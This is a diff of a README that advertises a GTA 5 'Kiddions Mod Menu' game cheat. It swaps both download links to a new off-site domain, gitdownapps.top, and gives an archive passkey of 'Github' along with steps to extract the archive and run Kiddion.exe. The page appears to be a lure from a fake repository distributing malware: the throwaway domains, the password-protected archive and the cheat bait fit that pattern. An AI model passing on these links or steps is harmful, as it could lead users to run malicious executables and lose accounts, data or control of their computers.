@@ -6,7 +6,7 @@ Kiddions Mod Menu for GTA 5 with money drop, god mode, vehicle spawn, teleport, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -98,7 +98,7 @@ The menu features a plain grey window without flashy visuals — what it lacks i
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive to any folder — **not your GTA 5 install directory**.
 3. Launch GTA 5 and load into GTA Online or Story Mode.
 4. Run `Kiddion.exe` — the menu opens in its own window alongside the game.
